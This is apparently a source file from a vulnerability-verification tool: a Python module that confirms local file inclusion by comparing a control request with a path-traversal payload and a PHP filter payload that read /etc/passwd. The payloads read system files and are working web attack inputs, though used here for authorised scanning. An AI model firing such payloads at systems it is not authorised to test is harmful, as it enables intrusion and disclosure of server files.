"""Local file inclusion / path traversal confirmation via differential markers.

The expected marker is the well-known first fields of /etc/passwd, checked
twice: in plaintext via directory traversal and as base64 via the PHP filter
wrapper, where the expected value is deterministic because base64 of the
marker is constant. The marker must be absent from the control response, so
a page that always contains it cannot produce a false confirmation.
"""

import secrets
from base64 import b64encode

from autorecon.proofmodules.base import ProofModule


class FileInclusion(ProofModule):
    name = 'lfi'
    check_name = 'file_inclusion'
    description = 'Local file inclusion / path traversal (differential /etc/passwd marker)'
    severity = 'high'
    cwe = 'CWE-22'
    rationale = 'Probes only ask the server to read /etc/passwd, a world-readable file with no secrets; nothing is written and no state changes.'
    max_requests = 3

    UNIX_TRAVERSAL = '../../../../../../etc/passwd'
    UNIX_FILTER = 'php://filter/convert.base64-encode/resource=../../../../etc/passwd'
    MARKER = 'root:x:0:0:'
    # base64 encodes 3-byte groups, so only a 3-byte-aligned prefix of the
    # marker appears verbatim in the encoded file content.
    MARKER_B64 = b64encode(MARKER[:9].encode('ascii')).decode('ascii')

    def verify(self, url, parameter, context):
        context.check_target(url, parameter)
        nonce = secrets.token_hex(8)
        cases = [
            ('control', 'ar' + nonce + 'control', None),
            ('probe-traversal', self.UNIX_TRAVERSAL, self.MARKER),
            ('probe-php-filter', self.UNIX_FILTER, self.MARKER_B64),
        ]
        probes = []
        marker_preexisting = False
        confirmed = True
        for label, payload, expected in cases:
            status, body = context.probe(url, parameter, payload)
            if label == 'control':
                marker_preexisting = self.MARKER in body or self.MARKER_B64 in body
                evaluated = status < 300
                if not evaluated:
                    confirmed = False
            else:
                evaluated = bool(expected and expected in body and payload not in body)
            probes.append(self.probe_entry(label, status, payload, expected, evaluated, body))
        hits = [probe for probe in probes if probe['kind'] != 'control' and probe['evaluated']]
        if not hits or marker_preexisting:
            confirmed = False
        return self.finding('confirmed' if confirmed else 'inconclusive',
                            url, parameter, probes, allowed_origin=context.allowed_origin,
                            marker_preexisting=marker_preexisting)
